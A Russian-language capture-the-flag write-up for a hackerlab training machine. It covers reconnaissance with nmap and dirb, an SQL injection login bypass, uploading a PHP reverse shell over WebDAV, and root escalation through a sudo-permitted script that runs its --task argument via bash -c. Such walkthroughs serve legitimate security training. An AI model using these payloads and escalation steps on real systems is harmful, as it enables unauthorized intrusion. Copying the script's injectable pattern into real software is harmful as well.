# Райтап на задание Career path в hackerlab

Уровень: Средний

https://hackerlab.pro/categories/pentest-machines/344326d9-a80d-4dc5-9f72-0351095eb2e4

## 1) Разведка

Сканируем IP через nmap:  
`nmap -v -sV -Pn {ip}`

видим:  
`80/tcp open  http    Apache httpd 2.4.66 ((Debian))`

Понимаем, что у нас веб‑сервер и, введя в браузере IP, попадаем в веб‑панель со входом, сканируем директории:

`dirb http://{ip}`

Ключевые директории:
- http://192.168.2.222/admin.php (код 301)
- http://192.168.2.222/api/login.php (API для логина)
- http://192.168.2.222/assets/app.js (код 200)
- http://192.168.2.222/dav (требуется авторизация)

## 2) Эксплуатация

Пытаемся выполнить SQL инъекцию в форме логина на сайте, пейлоады взял с https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

Подошёл вариант:  
`{"username":"admin","password":"'or'1%3d12"}`

Далее нас перекидывает в админку, где есть информация:

"  
Конфигурация WebDAV  
Пользователь:  
hacker  
Пароль:  
hackerlab161  
"

Переходим в http://192.168.2.222/dav и вводим данные, попадаем на страницу с папкой uploads, в которой ничего нет. Название папки "uploads" — приходит мысль, что мы можем что‑то загрузить. Смотрим, что такое WebDAV, находим, что это протокол обмена файлами с сервером, находим утилиту: cadaver и подключаемся командой:

`cadaver http://{ip}`

Попадаем в оболочку, мы можем загружать свои файлы командой `put [путь_до_вашего_файла]`

Загружаем PHP‑шелл, я использовал reverse shell с сайта: https://www.revshells.com/

## 3) Эскалация

Подключаемся к оболочке и смотрим, что мы:

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Смотрим директорию: `/home` и там файл с частью флага: `first_part.txt`

Далее нам нужно повысить привилегии до root.

Для того чтобы понять, что мы можем запускать от имени root, выполним команду:

`sudo -l`

Мы видим это:

```
User www-data may run the following commands on 1c1c81179ad5:
    (root) NOPASSWD: /usr/local/bin/maint-chroot
```

Смотрим, что это за скрипт, код:

```
#!/bin/bash
set -e

ROOTDIR="/var/maintenance/rootfs"
mkdir -p "$ROOTDIR"

TASK=""

while [ $# -gt 0 ]; do
  case "$1" in
    --task)
      shift
      TASK="${1:-}"
      ;;
    *)
      ;;
  esac
  shift || true
done

echo "[maint] maintenance rootfs: $ROOTDIR"
echo "[maint] running task..."

if [ -z "$TASK" ]; then
  echo "[maint] no task provided"
  exit 0
fi

bash -c "$TASK
```

Мы можем командой:  
`sudo /usr/local/bin/maint-chroot --task "bash"`

сделать себе интерактивный шелл от имени root, читаем оставшуюся часть флага в `/root` и на этом задание закончено.
